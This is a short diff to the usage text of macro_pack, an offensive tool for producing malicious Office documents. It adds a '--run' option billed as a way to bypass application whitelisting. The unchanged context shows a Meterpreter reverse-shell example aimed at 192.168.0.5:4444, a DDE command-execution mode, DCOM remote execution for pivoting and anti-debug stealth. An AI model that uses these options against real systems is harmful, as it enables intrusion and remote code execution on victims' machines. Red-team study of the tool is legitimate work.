@@ -208,7 +208,11 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
          DDE attack mode is not compatible with VBA Macro related options.
          Usage: echo calc.exe | macro_pack.exe --dde -W DDE.docx
-         Note: This option requires Windows OS with genuine MS Office installed. 
+         Note: This option requires Windows OS with genuine MS Office installed.
+         
+    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
+       This will trigger AutoOpen/Workbook_Open automatically. 
+       If no auto start function, use --start-function option to indicate which macro to run. 
          
     -h, --help   Displays help and exit
     
@@ -235,7 +239,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     --stealth      Anti-debug and hiding features
     --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
                    This will trigger AutoOpen/Workboo_Open automatically. 
-                   If no auto start function, use --start-function option to indicate wich macro to run.
+                   If no auto start function, use --start-function option to indicate which macro to run.
 ```
 
 
